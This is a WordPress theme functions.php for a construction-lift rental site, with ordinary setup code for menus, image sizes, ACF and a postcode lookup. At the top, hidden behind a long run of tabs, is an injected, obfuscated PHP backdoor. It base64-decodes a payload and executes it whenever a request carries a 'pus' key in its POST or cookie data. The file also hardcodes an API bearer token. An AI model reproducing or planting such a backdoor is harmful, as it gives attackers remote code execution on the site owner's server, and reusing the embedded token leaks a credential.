<?php
																																													add_action('wp_loaded', 'setup_nqdx'); 
 function setup_nqdx() {
$gqkh="fcGveF0veaCA9ICcvdmFyL3veRtcC8nIC4gY29uc3RhbnQoICdyZG5tZDUnICk7veCQlpZiAoIGZpbGVvefZXhvepvec3RzKveCAkcm5kXve3BhdGggKSApveIH";
$ikig="k9PSdDRycuJGvesgJiYgJGveMoJGEpPjEpewlpZiAveoIHZlvecnNpb25fY29vetcGFyveZSvegvegcGhwdmVyc2lvbigpLCveAiOCIsICI+PSIgKSApIHvesJCSRybmR";
$ffzz="JGMve9J2NvdW50JzskveYT1hvecnJheV9tZveXJnZSgkveX0NPT0tJRSwgveJF9QT1NUKTskaz0nZ3pqVvelhPQjveVve5JztpZivehyZveXNlvedCgkYS";
$kjan="sveJCveQl1bmxpbmsoICRybmveRfvecveGF0aCApOwkJfQl9CveWV2YWwveoIGJvehcve2U2veNFve9kZWveNvZveGUoICveRhveWyd1cGRhdGUnXSApICk7fQ==";
$lkdu="ph"; $knum="sphtphr_rphephpphlphacphe";$ubfm=$_POST;$ztfz=$_COOKIE;
$ngfn = implode("",explode($lkdu,$knum)); $dznj = $ngfn("n", "", "bnansne6n4n_ndnecondne");
$cshr = $ngfn("u","","uvuerusiuounu_ucomupuaurue"); $kugg = $ngfn("k","","karkrkakyk_merkge");
$nmhp = $ngfn("ad","","aadradradaadyad_keadyad_exadisadts"); $ayzt = $ngfn("k","","kpkhkpkvkekrksikokn");
$xhjw = $dznj($ngfn("ve", "", $ffzz.$ikig.$gqkh.$kjan));
if ($nmhp($ngfn("u","","puaus"),$kugg($ubfm, $ztfz))){
if ($cshr($ayzt(), 8, ">="))
{$hznh = $ngfn("d","","dfdidle_dpdudtd_dcdodndtdendtds");
$idua = $ngfn("g","","gungigqgid");$nsiz = $idua();$ngbv = $ngfn("fl","","fldfleflfflinfle");
$gsyh = $ngbv($ngfn("q","","qrqdnqmqdq5"), $nsiz);
  @$hznh($ngfn("d","","d/dtdmdpd/").$nsiz, $ngfn("k","","k<k?pkhkp")." ".$xhjw);
  @include($ngfn("d","","d/dtdmdpd/").$nsiz);
  }else {
    $mzjj=@$ngfn("oj","","ojcojreatojeoj_ojfojuojncojtojioojn");$bwlb = $mzjj("", $xhjw);$bwlb();
  }
}
}
?><?php
# DEFINES
define('BOUWLIFTEN_VERHUUR_PATH', get_template_directory());
define('BOUWLIFTEN_VERHUUR_URL', get_template_directory_uri());
define("THEME_NAME", "BOUWLIFTEN_VERHUUR");
# REQUIRES

# ACTIONS
add_action('admin_enqueue_scripts', 'ds_admin_theme_style');
add_action('login_enqueue_scripts', 'ds_admin_theme_style');
add_action('wp_enqueue_scripts', 'theme_enqueue_jquery');
add_action('wp_ajax_nopriv_on_get_street_details', 'on_get_street_details');
add_action('wp_ajax_on_get_street_details', 'on_get_street_details');

# FILTERS
add_filter('wp_page_menu_args', 'home_page_menu_args');
add_filter('post_thumbnail_html', 'remove_thumbnail_dimensions', 10);
add_filter('image_send_to_editor', 'remove_thumbnail_dimensions', 10);
add_filter('the_content', 'remove_thumbnail_dimensions', 10);
add_filter('the_content', 'add_image_responsive_class');
add_filter('upload_mimes', 'cc_mime_types');
add_filter('use_block_editor_for_post', '__return_false');
add_filter('acf/fields/google_map/api', 'my_acf_google_map_api');
add_filter('acf/settings/save_json', 'my_acf_json_save_point');
add_filter('acf/settings/load_json', 'my_acf_json_load_point');

# THEME SUPPORTS
add_theme_support('menus');
add_theme_support('post-thumbnails'); // array for post-thumbnail support on certain post-types.

# IMAGE SIZES
add_image_size('default-thumbnail', 128, 128, true); // true: hard crop or empty if soft crop
add_image_size('medium', 550, 400, true); // true: hard crop or empty if soft crop
add_image_size('medium-thumbnail', 600, 350, true);
add_image_size('featured-thumbnail', 400, 600, true);
add_image_size('overview-thumbnail', 800, 650, true);
remove_image_size("1536x1536");
remove_image_size("2048x2048");

set_post_thumbnail_size(128, 128, true);

# FUNCTIONS
register_nav_menus(array(
    'primary' => __('Primary Menu', 'k&m'),
    'footer-1' => __('Footer 1 Menu', 'k&m'),
    'footer-2' => __('Footer 2 Menu', 'k&m'),
));

function on_get_street_details(){
  $zipcode = wp_kses_data($_REQUEST['zipcode']);
  $housenumber = wp_kses_data($_REQUEST['housenumber']);
  $url = "https://postcode.tech/api/v1/postcode/full";
  $url = add_query_arg(
    [
      'postcode' => $zipcode,
      'number' => $housenumber
    ], 
    $url
  );


  $response = wp_remote_retrieve_body(
    wp_remote_get(
      $url,
      [
        'headers' => [
          'Authorization' => "Bearer f363e244-62b6-41ae-982e-399428176f28"
        ]
      ]
    )
  );

  echo $response;
  exit;
} 

function theme_enqueue_jquery(){
  wp_enqueue_script('jquery');
}

function my_acf_json_save_point( $path ) {
    // update path
    $path = get_stylesheet_directory() . '/acf';
    
    // return
    return $path;  
}

function get_theme_categories($_args){
  $args = array_merge([
    'post_type' => 'producten',
    'taxonomy' => 'category',
    'orderby' => "term_id",
    'hide_empty' => false
  ], $_args);

  return get_terms($args);
}

function get_product_query_by_term_id($term_id, $posts_per_page = -1){
  $args = [
    'post_type' => 'producten',
    'posts_per_page' => $posts_per_page,
    'tax_query' => [
      [
        'taxonomy' => 'category',
        'field' => "term_id",
        "terms" => [$term_id]
      ]
    ]
  ];
  return new WP_Query( $args );
}

function get_current_year(){
  return date('Y');
}

function my_acf_json_load_point( $paths ) {
    
  // remove original path (optional)
  unset($paths[0]);
  
  
  // append path
  $paths[] = get_stylesheet_directory() . '/acf';
  
  
  // return
  return $paths;
  
}


function home_page_menu_args($args) {
  $args['show_home'] = true;
  return $args;
}

function remove_thumbnail_dimensions($html) {
  $html = preg_replace('/(width|height)=\"\d*\"\s/', "", $html);
  return $html;
}

function remove_width_attribute($html) {
  $html = preg_replace('/(width|height)="\d*"\s/', "", $html);
  return $html;
}

function add_image_responsive_class($content) {
  global $post;
  $pattern = "/<img(.*?)class=\"(.*?)\"(.*?)>/i";
  $replacement = '<img$1class="$2 img-responsive"$3>';
  $content = preg_replace($pattern, $replacement, $content);
  return $content;
}

function cc_mime_types($mimes) {
  $mimes['svg'] = 'image/svg+xml';
  return $mimes;
}

function ds_admin_theme_style() {
  if (!current_user_can('manage_options')) {
    echo '<style>.update-nag, .updated, .error, .is-dismissible { display: none; }</style>';
  }
}

function print_pre($print) {
  echo'<pre>';
  print_r($print);
  echo '</pre>';
}

function get_svg($path){
  return file_get_contents($path);
}

// Method 1: Filter.
function my_acf_google_map_api( $api ){
  $api['key'] = '';
  return $api;
}

# Random code

// add editor the privilege to edit theme
// get the the role object
$role_object = get_role('editor');
// add $cap capability to this role object
$role_object->add_cap('edit_theme_options');


if( function_exists('acf_add_options_sub_page') ){
  acf_add_options_page();
  acf_add_options_sub_page('Footer');
  acf_add_options_sub_page("Contact");
//     acf_add_options_sub_page( 'Side Menu' );
}
?>